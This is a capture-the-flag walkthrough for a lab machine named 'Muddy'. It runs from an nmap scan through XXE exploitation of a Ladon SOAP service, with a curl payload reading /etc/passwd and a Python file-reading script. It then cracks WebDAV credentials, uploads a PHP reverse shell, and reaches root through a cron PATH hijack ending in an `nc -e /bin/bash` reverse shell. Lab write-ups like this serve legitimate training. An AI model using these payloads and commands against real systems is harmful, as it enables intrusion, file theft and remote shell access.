# Muddy
### Enumeration

```
# Nmap 7.92 scan initiated Fri Apr  1 15:54:19 2022 as: nmap -v -p- -sC -sV -oN tcp.out 192.168.58.161
Nmap scan report for 192.168.58.161
Host is up (0.00025s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp   open  smtp          Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.58.200], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  https?
808/tcp  open  ccproxy-http?
908/tcp  open  unknown
8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
|_http-server-header: WSGIServer/0.1 Python/2.7.16
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ladon Service Catalog
MAC Address: 00:50:56:BF:5F:85 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

##### 80
When we visit the IP, we are redirected to `muddy.ugc`, which we add to our virtual hosts file.

##### 8888
There's a [Ladon](https://pypi.org/project/ladon/) (Python) webserver. According to the readme, Ladon is a framework for exposing Python methods via an RPC server.

I initially made a request to the JSON-RPC interface (as this was the one for which I knew how to write requests), and noticed that the server would echo back the value of the `uid` parameter that we pass it.

Googling/trying `searchsploit ladon` reveals that there is an XXE (XML external entity) injection vulnerability in Ladon v0.9.40. If it's possible to send SOAP messages to the service, we'll be able to read local files and forge server side requests.

```shell-session
$ curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope
xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/>               
<soapenv:Body>                                                                    
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>         
</urn:checkout>                                          
</soapenv:Body>                                          
</soapenv:Envelope>' \                                   
'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <ns:checkoutResponse>
      <result>Serial number: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/falseian:x:1000:1000::/home/ian:/bin/shDebian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologinstatd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin</result>
    </ns:checkoutResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

We're able to get the user flag by requesting `/var/www/local.txt`.

Script to enumerate directories:

```python
import argparse
import requests
import sys
import xmltodict

def read_wordlist(wordlist_path):
    with open(wordlist_path, 'r') as f:
        return f.read().strip().split('\n')

def request_file(host, filepath, read):
    response = requests.post(
            f"http://{host}:8888/muddy/soap11",
            headers={
                'Content-Type': 'text/xml;charset=UTF-8',
                'SOAPAction': f'http://{host}:8888/muddy/soap11/checkout',
            },
            data=f'''<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file://{filepath}">
]>
<soapenv:Envelope
xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" 
xmlns:urn=\"urn:muddy\"><soapenv:Header/>               
<soapenv:Body>                                                                     
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>         
</urn:checkout>                                          
</soapenv:Body>                                          
</soapenv:Envelope>'''.encode('utf-8')
    )

    if response.status_code == 200:
        if read:
            print(xmltodict.parse(response.content, process_namespaces=True)['http://schemas.xmlsoap.org/soap/envelope/:Envelope']['http://schemas.xmlsoap.org/soap/envelope/:Body']['urn:muddy:checkoutResponse']['result'].removeprefix("Serial number: "))
        else:
            print(f"found {filepath}")

def run(host, wordlist, read):
    for word in wordlist:
        request_file(host, word, read)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    subparsers = parser.add_subparsers()

    enum_parser = subparsers.add_parser("enum")
    enum_parser.add_argument("-w", "--wordlist", required=True)
    enum_parser.set_defaults(func=lambda args: run(args.host, read_wordlist(args.wordlist), False))

    read_parser = subparsers.add_parser("read")
    read_parser.add_argument("-f", "--file", required=True)
    read_parser.set_defaults(func=lambda args: run(args.host, [args.file], True))

    args = parser.parse_args()

    func = getattr(args, "func", None)
    if func is None:
        parser.print_help()
        sys.exit(0)

    func(args)
```

### Foothold
We use the above to retrieve the basic auth credentials for the webdav endpoint on the webserver listening on port 80. These are located at `/var/www/html/webdav/passwd.dav`. The credentials are `administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0`.

We can crack this with john using `john --wordlist=rockyou.txt passwd.dav`. Then we have the credentials `administrant:sleepless`.

With these credentials, we can upload a PHP reverse shell using `curl -T /usr/share/webshells/php/reverse.php -u administrant:sleepless muddy.ugc/webdav/`, then start a listener on the port specified in `reverse.php` and visit `muddy.ugc/webdav/reverse.php`.

### Privilege Escalation
We run linpeas and see that the kernel version is highly likely vulnerable to the PTRACE_TRACEME exploit. However, after compiling and running, we find that the exploit requires `pkexec`, which is not available to us.

Instead, linpeas also flags that the path in `/etc/crontab` starts with `/dev/shm` which we can write to! Better yet, there's a job that runs every minute:

```
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status
```

So we create a file called `netstat` in `/dev/shm` with the contents `ping -c 2 192.168.52.200` and make it executable, then start `tcpdump` listening for ICMP requests. When the next minute comes, we see 2 pings, so we have code execution as root. We change the contents of `netstat` to `nc -e /bin/bash 192.168.58.200 111` and when the new minute arrives, we have a root shell!